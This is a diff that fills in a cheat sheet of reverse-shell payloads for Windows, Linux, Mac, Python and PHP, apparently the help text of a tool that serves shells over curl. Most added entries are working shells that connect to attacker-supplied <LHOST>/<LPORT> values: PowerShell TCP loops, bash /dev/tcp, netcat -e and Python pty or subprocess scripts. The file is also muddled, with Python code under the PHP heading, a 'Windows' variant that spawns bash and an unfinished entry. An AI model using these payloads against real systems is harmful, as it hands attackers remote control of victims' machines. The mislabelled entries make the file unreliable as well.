@@ -1,23 +1,71 @@
 W
 ---
 Windows Shells:
-[1] 
+[1: Powershell] $LHOST = "<LHOST>"; $LPORT = <LPORT>; $TCPClient = New-Object Net.Sockets.TCPClient($LHOST, $LPORT); $NetworkStream = $TCPClient.GetStream(); $StreamReader = New-Object IO.StreamReader($NetworkStream); $StreamWriter = New-Object IO.StreamWriter($NetworkStream); $StreamWriter.AutoFlush = $true; $Buffer = New-Object System.Byte[] 1024; while ($TCPClient.Connected) { while ($NetworkStream.DataAvailable) { $RawData = $NetworkStream.Read($Buffer, 0, $Buffer.Length); $Code = ([text.encoding]::UTF8).GetString($Buffer, 0, $RawData -1) }; if ($TCPClient.Connected -and $Code.Length -gt 1) { $Output = try { Invoke-Expression ($Code) 2>&1 } catch { $_ }; $StreamWriter.Write("$Output`n"); $Code = $null } }; $TCPClient.Close(); $NetworkStream.Close(); $StreamReader.Close(); $StreamWriter.Close()
 
+[2: Powershell] powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('<LHOST>',<LPORT>);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
+
+[3: 
 ---
 L
 ---
 Linux Shells:
-[1] 
+[1] bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
+[2] nc -c bash <LHOST> <LPORT>
+[3] nc <LHOST> <LPORT> -e bash
 
 ---
 M
 ---
 Mac Shells:
+[1] bash -i >& /dev/tcp/<LHOST>/<LPORT> 0>&1
+
+[2] nc -c bash <LHOST> <LPORT>
+
+[3] nc <LHOST> <LPORT> -e bash
+
+Note: All Linux and mac shells are the same
 ---
-P
+Py
 ---
 Python Shells:
 [1]
+
+---
+PHP
+---
+Php Shells:
+[1: Linux] python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("<LHOST>",<LPORT>));[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
+
+[2: Windows] import os,socket,subprocess,threading;
+def s2p(s, p):
+    while True:
+        data = s.recv(1024)
+        if len(data) > 0:
+            p.stdin.write(data)
+            p.stdin.flush()
+
+def p2s(s, p):
+    while True:
+        s.send(p.stdout.read(1))
+
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
+s.connect(("<LHOST>",<LPORT>))
+
+p=subprocess.Popen(["bash"], stdout=subprocess.PIPE, stderr=subprocess.STDOUT, stdin=subprocess.PIPE)
+
+s2p_thread = threading.Thread(target=s2p, args=[s, p])
+s2p_thread.daemon = True
+s2p_thread.start()
+
+p2s_thread = threading.Thread(target=p2s, args=[s, p])
+p2s_thread.daemon = True
+p2s_thread.start()
+
+try:
+    p.wait()
+except KeyboardInterrupt:
+    s.close()
 
 ---
 H
@@ -32,5 +80,6 @@ cURL Shells Usage:
     (W)indows
     (L)inux
     (M)ac
-    (P)ython
+    (Py)thon, i.e. -A "Py"
+    (PHP), i.e. -A "PHP"
     (H)elp
